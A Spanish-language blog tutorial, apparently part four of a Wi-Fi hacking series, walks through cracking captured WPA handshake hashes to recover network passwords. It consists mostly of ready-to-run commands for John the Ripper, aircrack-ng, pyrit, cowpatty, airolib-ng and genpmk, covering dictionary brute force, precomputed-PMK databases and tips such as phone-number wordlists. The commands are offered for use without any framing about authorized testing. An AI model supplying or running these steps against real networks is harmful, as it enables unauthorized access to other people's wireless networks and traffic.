---
layout: single
title: Wifi Hacking 4, Crackeo de hashes
excerpt: "En este artículo veremos como crackear los hashes que hemos obtenido para así lograr saber la contraseña."
date: 2022-07-08
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/Wifi-Hacking/wifi.webp
categories:
  - Wifi-Hacking
tags:  
  - Wifi-Hacking
---

![](/assets/images/Wifi-Hacking/cracking.jpg)

Este es el último paso que tenemos que realizar si `lo que queremos lograr es la contraseña` de la red. Para esto hay varias técnicas y dentro de las mismas hay otras sub técnicas con las que podremos acelerar el proceso. Por eso aquí veremos todas, aunque `con cualquiera se puede lograr el mismo resultado`, vosotros elegid la que prefiráis.

Todas las técnicas que veremos funcionan a base de `fuerza bruta`, es decir que utilizando un `diccionario` que viene a ser una lista de palabras/contraseñas filtradas/... va probando una a una hasta que encuentre la correcta.

`IMPORTANTE: no es raro que la contraseña sea un número de teléfono, por lo que no está mal probar con eso si no conseguimos resultado con otros diccionarios, si necesitas un diccionario con números de teléfono o alguna otra cosa puedes mirar este simple script que programé hace tiempo: https://github.com/AirilMusic/Pentesting-Hacking/blob/main/Passwords-and-Brute-Forcing/DictionaryCreator.py`

## John the Reaper

Vamos a empezar explicando como hacerlo con esta conocida herramienta. Pero como John no está especializado en wifi hacking primero tenemos que preparar el hash, es decir, extraerlo del archivo .cap:

```
# generar miCaptura.hccap, parte del paquete con las creds
> aircrack-ng -J miCaptura Captura-01.cap (esto hace el hccap pero en binario)

# genera hash de las creds
> hccap2john miCaptura.hccap > miHash (esto lo pasa a json, solo falte desencriptarlo)
```

Una vez hecho esto ya podremos crackear la contraseña:

```
> john --wordlist={diccionario.txt} miHash
```

## Airckrack

Ahora veremos como hacerlo con esta otra también conocida herramienta y la cual si es especializada en wifi hacking, por lo tanto, la captura no necesitará preparación previa:

```
> aircrack-ng -w {diccionario.txt} {captura.cap}
```

## Pyrit

También veremos como hacerlo con esta herramienta que ya es bastante antigua, por lo tanto, quizás hay que arreglarle un par de cosas al código o correrla con python2, sin optimizar es la más lenta, pero luego veremos que bien optimizada es la más rápida de todas y con diferencia.

```
# primero veremos si la captura tiene un handshake y tambien veremos el nombre del AP
> pyrit -r Captrua-01.cap analyze 

# crackear la contraseña:
> pyrit -r Captura-01.cap -e {nombre del ap} -i diccionario.txt attack_passthrough 
```

## Craking con Coupatty

```
> cowpatty -r {captura.cap} -f {diccionario.txt} -s {nombre del ap}
```

## TÉCNICAS DE ACELERACIÓN

Las técnicas que hemos visto son bastante lentas, por lo que si no queremos estar varias horas con eso también podemos utilizar las siguientes técnicas que son `considerablemente más rápidas`.

Para lograr esto necesitaremos tener un archivo de `contraseñas precomputarizadas`. De esta forma nos `ahorraremos pasos` del procedimiento, `aumentando así la velocidad` de cómputo. Esto tambien se hace con un ataque mediante base de datos.

## Crear diccionarios preestablecidos con Airolib

Para crear el diccionario precomputarizado:

```
> airolib-ng {passwords-airolib (osea, el nombre)} --import passwd {diccionario.txt} 

> file {passwords-airolib}

> airolib-ng {passwords-airolib} --import essid {essid del ap}

> airolib-ng {passwords-airolib} --clean all

> airolib-ng {passwords-airolib} --batch

> kill %%
```

Y una vez tengamos esto listo, crackeandolo con `Aircrack` veremos que es mucho mas rapido que antes.

```
> aircrack-ng -r {passwords-airolib} {Captura-01.cap}
```

## GenPMK

```
> genpmk -f {diccionario.txt} -s {essid de la red} -d {dic.genpmk (osea el nombre )}

> file {dic.genpmk}

> cowpatty -d {dic.genpmk} -r {Captura-01.cap} -s {essid de la red}
```

## Diccionario precomputarizado con Pyrit

```
> pyrit -e {essid de la red} -i {dic.genpmk} -r {Captura-01.cap} attack_cowpatty
```

## Ataque mediante basa de datos con Pyrit

Esta es la forma `mas rapida` de todas las que hemos visto.

```
> pyrit -i {diccionario.txt} import_passwords

> pyrit -e {essid de la red} create_essid

> pyrit batch

> pyrit -r {Captura-01.cap} attack_db
```
